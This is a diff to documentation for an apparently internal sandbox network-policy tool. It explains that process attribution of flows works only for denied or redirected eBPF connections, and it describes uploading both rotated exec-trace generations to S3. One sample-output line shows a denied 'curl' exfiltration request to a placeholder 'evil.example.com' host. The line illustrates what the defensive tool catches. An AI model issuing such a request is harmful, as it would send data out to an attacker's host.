@@ -66,53 +66,74 @@ The verb that justifies the phase. It reads both stores and correlates a flow
 to the process that made it:
 
 ```console
-$ km-netpolicy who api.github.com
-14:02:11  allow    ebpf     api.github.com  ← pid=4299 curl -s https://api.github.com/repos/capitalone/VulnHunter
-14:05:40  allow    resolver api.github.com  ← pid=5012 git fetch origin main
+$ km-netpolicy who evil.example.com
+14:05:02  deny     ebpf     evil.example.com  ← pid=4610 curl -s https://evil.example.com/exfil
+
+$ km-netpolicy who api.anthropic.com
+14:02:11  redirect ebpf     api.anthropic.com  ← pid=4299 curl -s https://api.anthropic.com/v1/messages
 ```
 
-**`who` returns nothing under `proxy` enforcement — by design, and this is an
-accepted limitation, not a bug to work around.** `flowlog.Record.PID` is
-populated only on the eBPF enforcement path; the DNS and HTTP proxies observe
-a connection, not the pid that opened it, and recovering one would mean a
-racy `/proc/net/tcp` source-port → inode → fd walk on the egress hot path.
-So on a `proxy`-enforcement box (the schema default), `who` has nothing to
-join a flow against and says so explicitly rather than printing `(none)`:
+**Attribution is narrower than "any flow" — it only ever works for a DENIED or
+REDIRECTED connection, on any enforcement mode.** `pkg/ebpf/bpf.c`'s
+`emit_event` fires only on `ACTION_DENY` and `ACTION_REDIRECT`; the connect4
+**allow** path deliberately emits no event at all (one event per allowed
+connection would be real CloudWatch volume), so there is no pid-bearing —
+often no flow at all — for an allowed connection. The DNS proxy, the HTTP
+proxy, and the eBPF resolver never record a pid on any verdict, allowed or
+not. So an **allowed** curl that succeeds is never attributable, even on a
+box already running `ebpf`/`both`:
 
 ```console
 $ km-netpolicy who api.github.com
+14:05:40  allow    resolver api.github.com  ← (no pid on this flow)
+
 None of these flows could be attributed to a process.
-Only the eBPF enforcement path records a pid alongside a flow, so pid
-attribution needs spec.network.enforcement: ebpf or both. The exec trace
-itself is complete regardless — see `km-netpolicy execs`.
+A flow only carries a pid when it was DENIED or REDIRECTED — the
+allowed-connection path records no pid (and, under ebpf/both, often
+no flow at all). So an ALLOWED connection is never attributable, even
+on a box already running spec.network.enforcement: ebpf or both — this
+is expected, not a sign the feature is broken. The exec trace itself
+is complete regardless — see `km-netpolicy execs`.
 ```
 
 This is the same shape of honesty as Phase 131's `transparent.go` gap: the
 capability has a hole, and the tool names it instead of hiding it behind
-silence. **The operator accepted this gap on 2026-08-29** on the grounds that
-`proxy` enforcement is effectively the Docker-substrate path, and Docker
-sandboxes are not in use — every sandbox that actually runs today is
-`ebpf`/`both`, where `who` is fully live. The exec trace itself (`execs`) is
-complete in **every** enforcement mode; only the correlation is
-mode-dependent.
+silence. `proxy` enforcement (the schema default) never carries a pid on
+*any* flow, so `who` is empty there unconditionally — that gap was accepted
+by the operator on 2026-08-29 on the grounds that `proxy` is effectively the
+Docker-substrate path, which is not in use. But even on `ebpf`/`both`, where
+`who` is otherwise live, the narrowing above still applies: attribution
+exists only for the deny/redirect subset of traffic, never for what got
+through cleanly. The exec trace itself (`execs`) is complete in **every**
+enforcement mode; only the correlation is this narrow.
 
-Attribution can also come back partial even under `ebpf`/`both` — a flow with
-no matching exec record (rotation discarded it, or the pid's lifetime window
-doesn't cover the flow's timestamp) prints its own reason rather than being
-silently dropped from the listing:
+Attribution can also come back partial for a genuinely pid-bearing flow — one
+with no matching exec record (rotation discarded it, or the pid's lifetime
+window doesn't cover the flow's timestamp) — which prints its own reason
+rather than being silently dropped from the listing:
 
 ```
-14:07:02  allow    ebpf     140.82.113.6:443  ← (no exec recorded for that pid)
+14:07:02  deny     ebpf     140.82.113.6:443  ← (no exec recorded for that pid)
 ```
 
 ### `execs save`
 
-Uploads the live trace to S3 and prints the URI:
+Uploads the trace to S3 and prints the URI — **both generations, when a
+retained rotated one exists**, each as its own object:
 
 ```console
 $ km-netpolicy execs save
 saved: s3://example-artifacts-123456789012/execs/sb-abc123/execs-20260829T140500Z.jsonl (48213 bytes)
+saved: s3://example-artifacts-123456789012/execs/sb-abc123/execs-20260829T140500Z.1.jsonl (16777182 bytes)
 ```
+
+The reader (`execs`/`who`) reads the live file **and** the retained `.1`
+generation, so a save that only uploaded the live one would silently drop
+whatever rotation kept on disk the moment a box has rotated once. The two are
+never concatenated into a single object — the retained generation is a
+separate, older time window, and merging them would misrepresent both. An
+absent `.1` (the common case: a box that has never rotated) uploads only the
+live generation, exactly as before.
 
 Modelled on `capture stop`'s upload (`docs/egress-census.md`): a Go verb using
 the AWS SDK and the instance role, not a bash script. It is named `save`
@@ -140,7 +161,7 @@ dead under `proxy` because of a permissions bug nobody could see without
 looking.
 
 So capture runs in its own root daemon, `km-execlog.service`, loading only the
-four execve/exit tracepoints — no cgroup programs, no resolver, no
+execve/exit tracepoints — no cgroup programs, no resolver, no
 enforcement — and it is provisioned **outside** the enforcement conditional,
 on every sandbox, regardless of mode. A facility that only records what
 already happened cannot widen a policy by being present, which is the same
@@ -268,6 +289,10 @@ box.
 
 ## Troubleshooting
 
+- **`km-netpolicy execs`/`who` print `cannot read exec store ...: permission
+  denied`** — the store is `0700` root-only (see above), and this is
+  `km-netpolicy` telling you so rather than silently reporting an empty
+  trace. Run `km shell --root` and retry.
 - **`km-netpolicy execs` prints `(none)` on a box that has clearly done
   things** — first check `journalctl -u km-execlog`. If the unit failed to
   attach its tracepoints (a missing `/sys/kernel/tracing` mount on an
@@ -286,11 +311,15 @@ box.
   full phase). If that log line is absent, the daemon has never failed a
   write and the trace genuinely is what it says it is.
 - **`who <host>` says it can't attribute anything** — read the message it
-  prints. It names whether the box is missing eBPF enforcement entirely
-  (`proxy` mode) or whether specific flows just have no matching exec record
-  (pid-lifetime window miss, or rotation discarded it) — those are different
-  problems with different fixes, and the verb distinguishes them rather than
-  collapsing both into silence.
+  prints. It distinguishes three different situations rather than collapsing
+  them into silence: the box is on `proxy` enforcement, where no flow ever
+  carries a pid; the flows it found were all **allowed**, and an allowed
+  connection never carries a pid on any enforcement mode (only a denied or
+  redirected one does — see `who <host>` above); or specific flows have a
+  pid but no matching exec record (pid-lifetime window miss, or rotation
+  discarded it). Those are three different problems with three different
+  fixes — running `ebpf`/`both` does not, by itself, make an allowed
+  connection attributable.
 - **A kernel-side ring-buffer drop is invisible to this tool.** `cilium/ebpf`
   exposes no drop counter for `BPF_MAP_TYPE_RINGBUF`, so the tracer can only
   detect a **stalled consumer** (its own drain loop falling behind), logged
